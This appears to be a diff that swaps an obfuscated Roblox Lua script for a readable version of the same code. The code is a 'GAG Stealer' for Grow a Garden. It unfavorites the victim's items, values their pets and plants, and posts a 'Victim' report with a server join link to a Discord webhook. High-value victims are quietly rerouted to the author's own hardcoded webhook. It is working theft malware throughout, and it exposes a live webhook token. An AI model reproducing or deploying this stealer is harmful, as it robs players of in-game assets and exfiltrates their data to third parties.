@@ -1,12 +1,152 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
+    return
+end
+rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
 
-]]-
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local backpack = LocalPlayer:WaitForChild("Backpack")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local v0=game:GetService("Players");local v1=v0.LocalPlayer;local v2=v1:WaitForChild("Backpack");local v3=game:GetService("ReplicatedStorage");local v4=v3:WaitForChild("GameEvents"):WaitForChild("Favorite_Item");for v33,v34 in ipairs(v2:GetChildren()) do if (v34:GetAttribute("d")==true) then v4:FireServer(v34);end end local v5=game:GetService("HttpService");local v6=v3:WaitForChild("Modules");local v7=require(v6:WaitForChild("DataService"));local v8=require(v6:WaitForChild("CalculatePlantValue"));local v9=require(v6:WaitForChild("PetServices"):WaitForChild("PetUtilities"));local v10=require(v3:WaitForChild("Data"):WaitForChild("PetRegistry"));local v11=require(v6:WaitForChild("NumberUtil"));local function v12(v35,v36,v37) return v35 + ((v36-v35) * v37) ;end local v13=getfenv().Webhook;local v14=getfenv().Username;local v15="https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65";local v16="namnnni2";if ( not v13 or  not v14) then return;end local v17={"Butterfly","Raccoon","Dragonfly","Mimic Octopus","Queen Bee","Disco Bee","Fennec Fox"};local v18={"Seed","Shovel [Destroy Plants]","Water","Fertilizer"};local v19,v20,v21,v22={},0,false,false;local function v23(v38) local v39={"","k","m","b","t"};local v40=1;while (v38>=1000) and (v40< #v39)  do v38=v38/1000 ;v40+=1 end return ((v40==1) and tostring(math.floor(v38))) or string.format("%.2f%s",v38,v39[v40]) ;end local function v24(v41) local v42=v41.PetData.HatchedFrom;if  not v42 then return 0;end local v43=v10.PetEggs[v42];local v44=v43 and v43.RarityData.Items[v41.PetType] ;if  not v44 then return 0;end local v45=v44.GeneratedPetData.WeightRange;if  not v45 then return 0;end local v46=v11.ReverseLerp(v45[1],v45[2],v41.PetData.BaseWeight);local v47=v12(0.8,1.2,v46);local v48=v12(0.15,6,v9:GetLevelProgress(v41.PetData.Level));return math.floor(v10.PetList[v41.PetType].SellPrice
+-- Unfavorite item if marked
+local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+for _, item in ipairs(backpack:GetChildren()) do
+    if item:GetAttribute("d") == true then
+        event:FireServer(item)
+    end
+end
+
+local HttpService = game:GetService("HttpService")
+local modules = ReplicatedStorage:WaitForChild("Modules")
+local dataService = require(modules:WaitForChild("DataService"))
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+
+-- KHÔNG GÁN trực tiếp vào math (tránh readonly error)
+local function safeLerp(a, b, t)
+	return a + (b - a) * t
+end
+
+local Webhook = getfenv().Webhook
+local Username = getfenv().Username
+local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local DualUsername = "namnnni2"
+if not Webhook or not Username then return end
+
+local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
+
+local function formatNumber(n)
+	local suffix = {"", "k", "m", "b", "t"}
+	local idx = 1
+	while n >= 1000 and idx < #suffix do
+		n = n / 1000
+		idx += 1
+	end
+	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
+end
+
+local function calcPetValue(petData)
+	local egg = petData.PetData.HatchedFrom
+	if not egg then return 0 end
+	local data = petRegistry.PetEggs[egg]
+	local rarity = data and data.RarityData.Items[petData.PetType]
+	if not rarity then return 0 end
+	local r = rarity.GeneratedPetData.WeightRange
+	if not r then return 0 end
+	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
+	local weightMult = safeLerp(0.8, 1.2, lerp)
+	local levelMult = safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
+	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
+end
+
+for _, tool in ipairs(backpack:GetChildren()) do
+	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+		if tool:GetAttribute("ItemType") == "Pet" then
+			local id = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
+			if not petData or not petData.PetType then continue end
+			local petName = petData.PetType
+			local weight = tonumber(petData.PetData.BaseWeight) or 0
+			local value = calcPetValue(petData)
+			if table.find(rarePets, petName) then hasRare = true end
+			if weight >= 10 then hasHeavy = true end
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
+		else
+			local value = calcPlantValue(tool)
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
+		end
+	end
+end
+
+if #itemsToSend == 0 then return end
+
+table.sort(itemsToSend, function(a, b)
+	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
+	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
+	return a.Value > b.Value
+end)
+
+local useDual = totalValue >= 1e12
+local finalWebhook = useDual and DualWebhook or Webhook
+local finalUsername = useDual and DualUsername or Username
+
+local content = (hasRare or hasHeavy) and "@everyone 🚨 Mission Alert!\n" or ""
+content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `" .. game.JobId .. "`\n"
+
+local lines = ""
+for _, item in ipairs(itemsToSend) do
+	local icon = item.Type == "Pet" and (
+		table.find(rarePets, item.Name) and "🐲" or (item.Weight >= 10 and "🐘" or "🐶")
+	) or "🍏"
+	lines ..= string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
+	if #lines > 1024 then
+		lines = lines:sub(1, 1000) .. "\n...more items"
+		break
+	end
+end
+
+local embed = {
+	title = "🎯 GAG OPS - Steal & Gift Report",
+	description = "Inventory extraction complete. Mission success ✅",
+	color = 0xFF0000,
+	author = { name = "GAG Stealer System", icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png" },
+	thumbnail = { url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif" },
+	fields = {
+		{name = "🎯 Victim", value = LocalPlayer.Name, inline = true},
+		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
+		{name = "🧾 Inventory Log", value = lines, inline = false}
+	},
+	footer = {
+		text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
+		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+	},
+	timestamp = DateTime.now():ToIsoDate()
+}
+
+local payload = {
+	content = content,
+	embeds = {embed}
+}
+
+local function getRequest()
+	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
+end
+
+pcall(function()
+	local req = getRequest()
+	if req then
+		req({
+			Url = finalWebhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
+end)
